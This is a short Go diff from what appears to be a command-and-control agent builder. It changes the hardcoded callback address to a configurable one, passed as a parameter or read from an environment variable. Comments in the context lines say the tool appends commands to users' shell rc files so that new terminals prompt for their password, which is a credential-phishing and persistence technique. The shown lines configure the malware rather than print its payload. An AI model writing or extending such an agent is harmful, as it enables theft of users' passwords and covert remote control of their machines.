@@ -212,7 +212,7 @@ type Cmd struct {
 
 // Update with callback timeout and c2 address
 var timeoutSetting = 1
-var c2 = "http://127.0.0.1:8005"
+var c2 string
 
 // Appends the following set of commands to the users rc files
 // When a new terminal opens the user will be asked to enter their password to complete terminal updates
@@ -259,7 +259,14 @@ int main(int argc, char *argv[]) {
 }
 `
 
-func Build() {
+func Build(c2server string) {
+
+	c2 = c2server
+
+	if os.Getenv("goc2server") != "" {
+		c2 = os.Getenv("goc2server")
+	}
+	
 	uuid := shortuuid.New()
 	user, err := user.Current()
 	agent := uuid + "_" + user.Uid
